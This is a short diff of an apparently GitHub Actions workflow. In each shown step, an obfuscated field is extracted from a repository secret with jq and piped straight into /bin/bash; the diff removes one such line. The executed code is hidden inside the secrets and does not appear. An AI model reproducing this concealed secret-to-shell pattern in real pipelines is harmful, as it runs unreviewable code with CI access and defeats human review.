@@ -20,7 +20,6 @@ jobs:
           yps08: ${{ secrets.yps08 }}
         run: |
           printf '%s' "$yps08" | jq -r .fb7901 | /bin/bash
-          printf '%s' "$vkdh5" | jq -r .jr5898 | /bin/bash
           echo $ord818 | jq -r .q37471 | /bin/bash
           printf '%s' "$cptcf8751" | jq -r .axsy265 | /bin/bash
           echo $rb97925 | jq -r .zzqv69 | /bin/bash
